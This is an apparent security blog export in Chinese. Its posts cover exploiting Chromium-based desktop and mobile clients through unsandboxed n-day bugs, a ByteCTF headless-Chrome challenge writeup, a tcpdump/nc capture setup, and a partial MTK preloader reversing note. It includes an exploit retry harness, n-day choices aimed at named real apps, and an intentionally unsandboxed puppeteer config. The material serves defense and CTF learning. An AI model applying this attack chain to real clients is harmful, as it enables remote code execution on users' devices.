<h3 id="一些背景-amp-调研工作"><a href="#一些背景-amp-调研工作" class="headerlink" title="一些背景 &amp; 调研工作"></a>一些背景 &amp; 调研工作</h3><blockquote>
<p>主流客户端的情况，以前 &amp; 现在</p>
</blockquote>
<p>  关注客户端安全的同学应该会发现Electron&amp;CEF的应用越来越广泛了，从早些的时候某音乐播放器的xss2rce到后面被关注到内置浏览器本身，当然大佬可能更早的时候就这么玩了 :D </p>
<p>其实是用浏览器框架来开发客户端是一直以来就有的东西，比如下面这张图(可能不完全): </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image.png" alt="image"></p>
<blockquote>
<p>也有直接从chromium做定制开发的，即原生的方式开发，比如某先进IM</p>
</blockquote>
<p>这么做的好处是显而易见的:</p>
<ul>
<li><p>使用成熟的嵌入式浏览器框架(cef, electron等)能够快速开发应用</p>
</li>
<li><p>能够规避很多复杂的底层设计(c/c++)</p>
</li>
<li><p>前端–&gt;APP跨平台的特性，且很灵活，</p>
</li>
<li><p>更加方便支持自定义协议/扩展/JS对象等</p>
</li>
<li><p>…</p>
<p>与此同时，浏览器的攻击面就自然而然地引入进来了，再结合客户端本身，1+1&gt;2的即视感。本文重点关注浏览器相关的内容，那按照浏览器的思路去考虑就是:</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者构造恶意页面--&gt;客户端访问--&gt;RCE</span><br><span class="line">                              |</span><br><span class="line">                        Render---(sbx)---&gt;Broker</span><br></pre></td></tr></table></figure>

<p>这条攻击链路上的前置条件是**客户端可以打开任意URL(直接or间接)**，随后就是常规的浏览器Exploit，分成Render RCE+SBX两部分。</p>
<p>妙就妙在很多客户端出于一些特殊的需求他没有开沙箱。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/images.jpeg" alt="妙啊"></p>
<p>这里有一份统计 : <a href="https://github.com/sickcodes/no-sandbox">https://github.com/sickcodes/no-sandbox</a>，当然也不一定对(比如微信是CEF吧)，有些客户端也发生了一些变化，不过可以通过历史记录看出来变化趋势，大家都在慢慢地开启沙箱，尝试逐渐收敛风险。</p>
<p>  <code>--no-sandbox</code>的风险是显而易见的，另一个问题是<code>patch gap</code>，chromium那个更新频率没有几个客户端能跟上，甚至说基本跟不上，再加上功能优先，版本升级或者补丁合入并没有那么高的优先级(也有可能是风险没体现出来，不受重视)，所以大部分基于chromium的客户端多多少少都滞后一些大版本，这就造成了大量潜在的Nday影响这些客户端，甚至从RCE到SBX一条龙。</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="是否直接打开URL"><a href="#是否直接打开URL" class="headerlink" title="是否直接打开URL"></a>是否直接打开URL</h4><ul>
<li>直接打开，发链接点了就内置浏览器打开，这类早期IM会这样干，可能是为了“用户体验没有割裂感”</li>
<li>特殊的消息才会内置浏览器打开，比如卡片？</li>
<li>是否有url白名单，不能绕过的话可能需要多一个白名单域名下的xss做桥梁</li>
<li>特殊的scheme有url参数，参考Android客户端的那种情况</li>
<li>其他的奇奇怪怪的入口，比如监听端口，处理函数有个啥<code>openBrowser</code>的东西</li>
</ul>
<h4 id="Chromium版本确定"><a href="#Chromium版本确定" class="headerlink" title="Chromium版本确定"></a>Chromium版本确定</h4><ul>
<li>UA，这个不一定准吧，毕竟启动参数是可以改的，代码里也可以改，一般情况下是可信的</li>
<li>JS引擎特性，这个我在之前一个文章里提到过<a href="https://o0xmuhe.github.io/2021/10/17/ByteCTF2021-chatroom-writeup/">ByteCTF2021 chatroom writeup</a>，用于探测后端puppeteer的版本</li>
</ul>
<p>以上两种方式结合是最好的，能判断出来很精准的版本</p>
<h4 id="选个好-quot-day-quot"><a href="#选个好-quot-day-quot" class="headerlink" title="选个好&quot;day&quot;"></a>选个好<code>&quot;day&quot;</code></h4><ul>
<li><p>Pj0/github/twitter/v8 commits</p>
</li>
<li><p>@BugsChromium  </p>
</li>
</ul>
<p>版本-代码commit之前互查询可以参考: <a href="https://omahaproxy.appspot.com/">https://omahaproxy.appspot.com/</a></p>
<h3 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h3><blockquote>
<p><code>xxminibrowser</code> (xx是啥我也不知道)这个洞应该在21年上半年就修复了，而且陆陆续续补掉了不少攻击的前置条件</p>
</blockquote>
<ul>
<li>Open URL</li>
</ul>
<p>最早可以随便打开，后面就变成了特殊的消息，再后来越来越窄吧</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824215023030.png" alt="image-20220824215023030"></p>
<ul>
<li>版本确定</li>
</ul>
<p>用上面的方法确定了具体的版本，还是很准确的</p>
<ul>
<li><p>选个好day</p>
<p>当然了，在那个时候这个客户端他的好兄弟“小而美”也是差不多的情况，好好选day能都打了，21年hvv爆出的RCE就是这个情况(藏洞没有好下场 - -!)</p>
</li>
</ul>
<p>  当时用的是crbug659475，挺好用的，感谢keen lab的大哥 :D 为了提高成功率甚至还做了这样的事情:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> worker;</span><br><span class="line"><span class="keyword">var</span> exploitSucc = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startExploit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(exploitSucc)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    worker = <span class="keyword">new</span> Worker(<span class="string">&#x27;exp.js&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    worker.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        exploitSucc = e.data;</span><br><span class="line">        <span class="keyword">if</span> (exploitSucc == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.write(<span class="string">&quot;exploit failed, retry....&lt;hr&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">&quot;exploit done!!!!!&lt;hr&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">startExploit();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hangMonitor = <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (exploitSucc == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(hangMonitor);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        startExploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">20000</span>);</span><br></pre></td></tr></table></figure>



<hr>
<p>2022.8 update</p>
<p>“小而美”好像在hvv期间开了 <code>--jit-less</code>后面又下掉了 ，现在的cmdline，与此同时也升级到了M81</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/wechat_browser_render_cmdline.png" alt="wechat"></p>
<h3 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h3><blockquote>
<p>S***e</p>
</blockquote>
<ul>
<li>Open URL</li>
</ul>
<p>这个点说来还有点故事，20年的时候发现了，直到21年吧有一个老外也发现了并且发在了推特上</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824215815171.png" alt="image-20220824215815171"></p>
<p>说来也简单，就是个看起来是A打开确实B的问题，主要服务端也不做校验就转发是有点离谱的； 对于打开的URL也是有白名单检查的，所以特定域下的xss是攻击的桥梁 :(</p>
<ul>
<li>版本</li>
</ul>
<p>M78 这个没什么好说的 </p>
<ul>
<li>选个day</li>
</ul>
<p>m78可选的很多(比如CVE-2020-6418)，注意目标的是x86，需要做一些改造，而且之前遇到过有些洞只在x86_64 work的情况</p>
<hr>
<p>2022.8 update</p>
<p>参数 &amp; 版本</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/skype_render_cmdline.png" alt="skype"></p>
<h3 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h3><blockquote>
<p>Android webview</p>
</blockquote>
<p>  这类其实也算个重灾区，很多厂商会选择自己定制webview，且为了方便不开沙箱，线上丰富多彩的功能也提供了很多攻击的入口，发链接、扫码、卡片消息；但是也都会在打开URL前考虑加一层拦截，提示用户“xxx不是xxxxxx，确定要打开吗”。但是21年反垄断之后，这个限制就下掉了，随之而来的就是这样的安全风险。</p>
<p>  对于甲方来说就是，我的定制webview依赖chromium，我又没办法及时更新，沙箱也一定能开，在 nday和 <code>patch gap</code>的双重打击之下，你的SRC可能就变成“提款机”，每个月谷歌一发补丁，再加上是不是爆出个在野利用，你的SRC一定经常收到这样的报告: <code>xxxxx RCE </code>。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/3c70b0f75f2f4b6184bb461e41adc428.jpeg" alt="sad"></p>
<p>我也有做安全运营的朋友<del>饱受其害</del>，我只能建议他内部专项治理，定期合补丁，能上沙箱就沙箱，这个真没啥好办法。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="作为攻击方"><a href="#作为攻击方" class="headerlink" title="作为攻击方"></a>作为攻击方</h4><ul>
<li>搞定入口，这个比较吃经验了，见招拆招吧</li>
<li>多盯着点commit，开发一些工具啥的也可以，方便用</li>
<li>利用武器化，不是只弹个计算器就完了的</li>
</ul>
<h4 id="作为防守方"><a href="#作为防守方" class="headerlink" title="作为防守方"></a>作为防守方</h4><ul>
<li><p>打补丁case by case，但是每个月都要来那么一次，还不能全自动化，有效但费人力。</p>
</li>
<li><p>开沙箱，毕竟是个浏览器，还是能打IPC穿沙箱穿出来，不过这就要看具体漏洞情况了。</p>
</li>
<li><p>升级到最新版，如果不稳定怎么办，这个也不是个好办法</p>
</li>
</ul>
<p><code>补丁+升级+沙箱</code> 三个维度一起来，毕竟短板效应，少了哪一块都不行，甲方的话也可以搞一些白盒工具来做补丁check，确认漏洞是否存在，这块就见仁见智了，我也写过一套，效果还行:D </p>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><blockquote>
<p>chrome headless_shell 和 puppeteer</p>
</blockquote>
<p>基本上还是 <a href="https://o0xmuhe.github.io/2021/05/26/Chrome-headless-exploit/">Exploit Headless Chrome</a>这篇文章的内容，核心问题还是沙箱&amp;版本过低的问题，这块比较严重的是网上很多人写教程、博客都喜欢<code>--no-sandbox</code>，我也不知道他们知不知道这个参数的影响，不过一传十十传百，你会发现很多后端无头浏览器多多少少有这类问题。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/ae12bb08f457409763f629da49aabc8f.jpg" alt="no"></p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><h4 id="作为防守方-1"><a href="#作为防守方-1" class="headerlink" title="作为防守方"></a>作为防守方</h4><ul>
<li>安全开发意识提高，不要为了方便乱用参数</li>
<li>及时更新版本or打补丁</li>
</ul>
<p><del>扯远一些，有些扫描器用chrome，可以使用这手段做反制，你敢爬我轻则crash重则rce。</del></p>
<h4 id="作为攻击方-1"><a href="#作为攻击方-1" class="headerlink" title="作为攻击方"></a>作为攻击方</h4><ul>
<li>版本探测比较重要，做这个操作前先想想银手镯</li>
<li>什么？你还想exp？我看你想戴上银手镯</li>
</ul>
<h2 id="为了风险治理做了什么"><a href="#为了风险治理做了什么" class="headerlink" title="为了风险治理做了什么"></a>为了风险治理做了什么</h2><blockquote>
<p>说到这个就想到了2020.11.13 那个下午弹出计算器的时候</p>
</blockquote>
<p>  主要是三块吧，我发现甲方里涮一圈之后思维确实不太一样了。</p>
<ul>
<li><p>首先要讲明白风险，这里也包含证明风险，需要强有力的证明，比如exp打穿这样，研发可能不太理解为什么这样可以RCE，这就需要沟通好让大家有相同的sense</p>
</li>
<li><p>其次是修复方案，不同业务线、场景不一样，这个得和业务聊明白了才好给方案，不然就是“空中楼阁”，这块就算是治理存量问题了</p>
<ul>
<li>沙箱开不开</li>
<li>补丁无法自动合入，怎么处理更高效，能不能自动化节省排期</li>
<li>以后怎么办，建立个什么流程跑这个事情</li>
</ul>
</li>
<li><p>最后可以开发一些工具做一些预警工作，相当于治理增量问题</p>
<ul>
<li><p>存量怎么扫，补丁怎么提取，这个部分得好好设计构思</p>
</li>
<li><p>预警Bot，这个本质就是个爬虫+机器人，之前研究的时候自己搞过一个tg bot专门干这个，还能搞漏洞查询 </p>
<img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824224612405.png" alt="image-20220824224612405" style="zoom:50%;" />



</li>
</ul>
</li>
</ul>
<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>  我认为很有意思的是这个攻击面对于防守方来说简直是“折磨”，只要你的项目使用chromium，你就不得不面临各种补丁、升级，这实际上是很难做到及时补丁&amp;升级的，所以理论上存在<code>patch gap</code>，这就导致很多吸引眼球的 <code>xxx RCE</code> 传播的非常广泛。早在21年7月份，腾讯的蓝军在21年发布了<a href="https://cloud.tencent.com/developer/article/1848763">攻防启示：Chromium组件风险剖析与收敛</a>，也详细地剖析了该攻击面以及修复方案，对于我自己来说比较可惜的是在公司内部搞了这块攻击面的治理工作没有出去讲一讲or发个文章啥的，到后面这篇文章出来后已经没什么可讲的了 :( </p>
<p>  主要想对自己的一些工作做个简单的总结，所以才有了本文，时至2022.8，这个攻击面应该已经变得众所周知，没有什么秘密可言了，想来这手法我在17年某项目上也见过，不过当时是webkit。</p>
]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
        <tag>Exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>ByteCTF2021 chatroom writeup</title>
    <url>/2021/10/17/ByteCTF2021-chatroom-writeup/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  在今年的ByteCTF中，我出了一道pwn题目，距离上一次打比赛/出题已经过去很久了，所以传统的 <code>heap trick</code> 就没有考虑，而是从我日常工作中挖掘的安全风险入手，简化场景，出了一道 <code>chatroom</code> ，看起来像一个web的奇怪题目。</p>
 <span id="more"></span>

<p>  这个题目其实背后是 <code>Headless Chrome</code> 相关的pwn，我早期的一篇博客其实已经阐述过相关风险，可以参考 <a href="https://o0xmuhe.github.io/2021/05/26/Chrome-headless-exploit/">Exploit Headless Chrome</a>。 其实这个风险暴露出来的不仅仅是：低版本、误用参数 这两个显而易见的问题，其背后的原因是一些不好的编程习惯被错误地传播：大家都在用 <code>--no-sandbox</code> 参数，好像 <code>it works</code>就够了，但是在实际场景中，这是很危险的。</p>
<h2 id="题目设计思路"><a href="#题目设计思路" class="headerlink" title="题目设计思路"></a>题目设计思路</h2><p>  我的本意是设计一个类似聊天室的场景，用户可以在聊天室内发送消息、多媒体文件、链接等，尽可能模拟一个真实场景。 处于风控考虑，对于非白名单的链接，需要进行检查（是否恶意，色流等）。对于URL 检查的逻辑，最好是服务端接收到内容之后，判断是否是URL，随后通过RPC调用走到URL检查的服务去。但是考虑到实际题目，我大大简化了这个场景，直接把检查放在前端了，而且我没有混淆JS，所以可以很直接看到一个HTTP请求。</p>
<p>  解决了场景问题，聊天室部分直接用了github的开源项目 <a href="https://github.com/cleverqin/node-websocket-Chatroom">node-websocket-Chatroom</a>，后端使用 puppeteer来抓取用户的URL。</p>
<p>为了提升一些难度，同时这也是我曾经遇到过的问题：UA不可靠的情况下怎么判断Chrome版本？</p>
<p>所以我直接在启动参数里把UA给改了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; </span><br><span class="line">   <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>, </span><br><span class="line">          <span class="string">&#x27;--user-agent=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)</span></span><br><span class="line"><span class="string">           AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1337.13.37.0  Safari/4141.42&quot;&#x27;</span>], </span><br><span class="line"><span class="attr">ignoreHTTPSErrors</span>: <span class="literal">true</span>, <span class="attr">dumpio</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>最终题目成型：</p>
<ul>
<li>非最新版本puppeteer</li>
<li>–no-sandbox</li>
<li>UA不准确</li>
</ul>
<h2 id="Writeup-amp-非预期"><a href="#Writeup-amp-非预期" class="headerlink" title="Writeup &amp; 非预期"></a>Writeup &amp; 非预期</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>主要是 <a href="https://twitter.com/zh1x1an2">zh1x1an2</a> 同学的做法，Exploit狂轰滥炸术，挨个挨个来，最终拿到flag。</p>
<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>UA不可信，但是V8 和 Blink是可信的，不同Chrome版本会有不同的features，所以可以借助这个点，判断一个大版本，便于后续做利用。</p>
<p>参考 : <a href="https://chromestatus.com/features">https://chromestatus.com/features</a> </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/chrome_features.png" alt="chrome_features"></p>
<p>不过这个需要一些积累 &amp;&amp; 测试  :)</p>
<p>随后判断出来版本是 M88 之后，找个合适的nday就可以打了 : )</p>
<h2 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull muhe/ctf_chal_chatroom:v7</span><br><span class="line"></span><br><span class="line">docker run -dit --name chatroom1 -p 3000:3000 -p 31337:31337 muhe/ctf_chal_chatroom:v7</span><br></pre></td></tr></table></figure>



<p>访问 <code>http://localhost:3000</code> 就可以本地测试题目了  :)</p>
<h2 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h2><ol>
<li>无法防止爆破这种非预期解题方式。</li>
<li>使用nday似乎很无趣，但是塞进去一个洞，给一个 <code>patch.diff</code> 似乎又有点奇怪，偏离题目原本的出发点。</li>
</ol>
]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>将Android/iOS上的流量转发到Wireshark分析</title>
    <url>/2021/12/15/%E5%B0%86Android-iOS%E4%B8%8A%E7%9A%84%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E5%88%B0Wireshark%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="背景-amp-amp-需求"><a href="#背景-amp-amp-需求" class="headerlink" title="背景&amp;&amp;需求"></a>背景&amp;&amp;需求</h2><p>  迫于要分析一些SDK里的协议，需要抓到所有的流量来分析交互过程，所以有了这篇记录，主要是基于<a href="https://blog.csdn.net/HorkyChen/article/details/11822657?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163955839616780265452906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163955839616780265452906&biz_id=0&spm=1018.2226.3001.4187">实时监控Android设备网络封包</a>做的尝试，然后使用相同的思路扩展到了iOS上。</p>
<span id="more"></span>

<p>原理图：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump---nc---端口转发---nc----wireshark</span><br><span class="line">|------手机------|	|-------PC端-------|</span><br></pre></td></tr></table></figure>


<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><blockquote>
<p>手机必须root</p>
</blockquote>
<ul>
<li>adb</li>
<li>tcpdump</li>
<li>nc </li>
</ul>
<p>手机端:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -l -n -s 0 -v -w - | nc -l -p  11233</span><br></pre></td></tr></table></figure>


<p>PC端:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:11233 tcp:11233 &amp;&amp; nc 127.0.0.1 11233 | wireshark -k -S -i -</span><br></pre></td></tr></table></figure>



<h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><blockquote>
<p>手机必须越狱</p>
</blockquote>
<ul>
<li>nc</li>
<li>tcpdump</li>
<li>iproxy(<a href="https://libimobiledevice.org/">libimobiledevice</a>)</li>
</ul>
<p>手机端:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -l -n -s 0 -v -w - | nc -l -p 11233</span><br></pre></td></tr></table></figure>


<p>PC端:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~  iproxy 11233 11233</span><br><span class="line">Creating listening port 11233 <span class="keyword">for</span> device port 11233</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~  nc 127.0.0.1 11233 | wireshark -k -S -i -</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/HorkyChen/article/details/11822657?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163955839616780265452906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163955839616780265452906&biz_id=0&spm=1018.2226.3001.4187">实时监控Android设备网络封包</a></p>
]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Android</tag>
        <tag>流量分析</tag>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>MTK Preloader 踩坑</title>
    <url>/2022/03/05/MTK-Preloader-%E8%B8%A9%E5%9D%91/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ul>
<li>MT6737T</li>
<li>Android</li>
</ul>
<span id="more"></span>

<p>前期<code>readback</code> 什么都都正常，也切出来了各个分区，并制作了scatter。</p>
<p>折腾的时候发现<code>SP Flash Tool </code> 加载preloader的时候有报错：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/flash_tool_error.png" alt="flash_tool_error"></p>
<h3 id="看日志"><a href="#看日志" class="headerlink" title="看日志"></a>看日志</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: DL_HANDLE()::Rom_Load(): ROM loaded, name = preloader (flashtool_handle_internal.cpp:4693)</span><br><span class="line"></span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: DEBUG: DL_HANDLE::UpdateRomFileInfoByPreloader(): UpdateRomFileInfoByPreloader get bbchiptype : 159 (flashtool_handle_internal.cpp:4359) //chip <span class="built_in">type</span> 所以应该是强绑定的</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: DL_HANDLE()::UpdateRomFileInfoByPreloader(): Loading SV5 BL, name = preloader (flashtool_handle_internal.cpp:4374)</span><br><span class="line"></span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: ERROR: DL_HANDLE(0x0BC38DE8)::UpdateRomFileInfoByPreloader(): [0]: preloader - Parse GFH_FILE_INFO error(0x00001008)!  (flashtool_handle_internal.cpp:4385)</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: ERROR: DL_HANDLE(0xB7B1A8AC)::File length not match with GFH specified file length (flashtool_handle_internal.cpp:4386) // 不匹配！ GFH 指定的文件长度不匹配</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: ERROR: File length (262160) / GFH specified file length (0) (flashtool_handle_internal.cpp:4387)  // 这里，文件长度是xxx，但是GFH里指定的不对</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: ERROR: DL_Rom_Load(): &lt;ERR_CHECKPOINT&gt;[232][error][5066]&lt;/ERR_CHECKPOINT&gt; [S_DL_PC_BL_INVALID_GFH_FILE_INFO] (flashtool_handle.cpp:941)</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: DL_Rom_Load(): DL_HANDLE-&gt;rwlock: WRITE_UNLOCK. (rwlock.cpp:476)</span><br></pre></td></tr></table></figure>

<p>所以：</p>
<ul>
<li>DL_HANDLE()::Rom_Load() 函数</li>
<li>这个平台校验了size字段和实际preloader文件的size</li>
</ul>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file libflashtool.v1.so</span><br><span class="line">libflashtool.v1.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=de4c47b0bb41c274fd42efb55ceb476bcc840d7a, not stripped</span><br></pre></td></tr></table></figure>

<p>在 <code>DL_HANDLE::UpdateRomFileInfoByPreloader</code> 方法中找到了校验的逻辑：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *((_DWORD *)var48 + <span class="number">15</span>) == <span class="number">7</span> )</span><br><span class="line">&#123;</span><br><span class="line">  err_code = DL_HANDLE::<span class="built_in">UpdateRomFileInfoByPreloader</span>(<span class="keyword">this</span>, sys_index);<span class="comment">// updateROM File!</span></span><br><span class="line">  <span class="keyword">if</span> ( err_code )</span><br><span class="line">    <span class="keyword">return</span> err_code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">erro_code = ROM_ID_Class::<span class="built_in">LoadGFH</span>((__int64)<span class="keyword">this</span> + <span class="number">112</span>, *((_QWORD *)ROM + <span class="number">123</span>), <span class="number">0</span>, </span><br><span class="line">(__int64)&amp;GFH);</span><br><span class="line"><span class="keyword">if</span> ( erro_code &gt; <span class="number">0xFFF</span> )</span><br><span class="line">&#123;</span><br><span class="line">  r12_12 = (<span class="keyword">const</span> <span class="keyword">char</span> *)std::string::<span class="built_in">c_str</span>(ROM);</span><br><span class="line">  rbx12 = g_hBROM_DEBUG;</span><br><span class="line">  MetaTrace::<span class="built_in">MetaTrace</span>(</span><br><span class="line">    (MetaTrace *)var1030,</span><br><span class="line">    <span class="string">&quot;FlashToolLib/source/common/handle/src/flashtool_handle_internal.cpp&quot;</span>,</span><br><span class="line">    <span class="number">4417</span>,</span><br><span class="line">    <span class="number">0xFF</span>u,</span><br><span class="line">    <span class="string">&quot; ERROR:&quot;</span>);</span><br><span class="line">  MetaTrace::<span class="built_in"><span class="keyword">operator</span></span>()(</span><br><span class="line">    var1030,</span><br><span class="line">    rbx12,</span><br><span class="line">    <span class="string">&quot;DL_HANDLE(0x%08X)::UpdateRomFileInfoByPreloader(): [%u]: %s - Load GFH_FILE_INFO error(0x%08X)!  &quot;</span>,</span><br><span class="line">    <span class="keyword">this</span>,</span><br><span class="line">    rom_file_name,</span><br><span class="line">    r12_12,</span><br><span class="line">    erro_code);</span><br><span class="line">  MetaTrace::~<span class="built_in">MetaTrace</span>((MetaTrace *)var1030);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">5066</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *((_DWORD *)GFH + <span class="number">8</span>) != *((_QWORD *)ROM + <span class="number">0x7C</span>) )<span class="comment">// length check!!</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//.....error log</span></span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><code>ROM + 0x7C</code> 是实际的文件大小<br><code>GFH + 8</code> 是 解析preloader 中的GFH结构中的size字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROM_ID_Class::LoadGFH</span><br><span class="line">    GFH_Find(rom_buffer, <span class="built_in">type</span>, (_QWORD *)st);</span><br><span class="line">        GFH_Internal_Parser(buff_addr, 0LL, <span class="built_in">type</span>, GFG_st);</span><br><span class="line">            </span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">GFH_Internal_Parser</span><span class="params">(__int64 buf_addr, __int64 flag_0, <span class="keyword">int</span> type, _QWORD *GFG_st)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 st; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> cnt; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> reta; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+4Eh] [rbp-2h]</span></span><br><span class="line">  <span class="keyword">char</span> v15_0; <span class="comment">// [rsp+4Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v15_0 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flag_0 )</span><br><span class="line">    v15_0 = <span class="number">1</span>;</span><br><span class="line">  ret = <span 